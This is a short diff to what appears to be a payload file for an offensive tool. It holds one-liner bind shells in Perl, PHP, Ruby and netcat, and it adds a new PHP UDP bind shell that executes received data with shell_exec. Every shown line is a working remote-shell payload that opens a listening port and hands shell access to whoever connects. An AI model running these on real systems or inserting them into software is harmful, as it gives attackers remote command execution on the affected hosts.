@@ -10,6 +10,8 @@ BIND_PERL_TCP = """perl -e 'use Socket;$p=PORT;socket(S,PF_INET,SOCK_STREAM,getp
 
 BIND_PHP_TCP = """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",PORT);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"""
 
+BIND_PHP_UDP = """php -r '$s=socket_create(AF_INET, SOCK_DGRAM, 0);socket_bind($s,"0.0.0.0",PORT);while(1){ socket_recvfrom($s, $buf, 1024, 0, $remote_ip, $remote_port);$d=shell_exec($buf);socket_sendto($s,$d,1024,0,$remote_ip,$remote_port);}'"""
+
 BIND_RUBY_TCP = """ruby -rsocket -e 'f=TCPServer.new(PORT);s=f.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",s,s,s)'"""
 
 BIND_NETCAT_TCP = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp PORT >/tmp/f"""
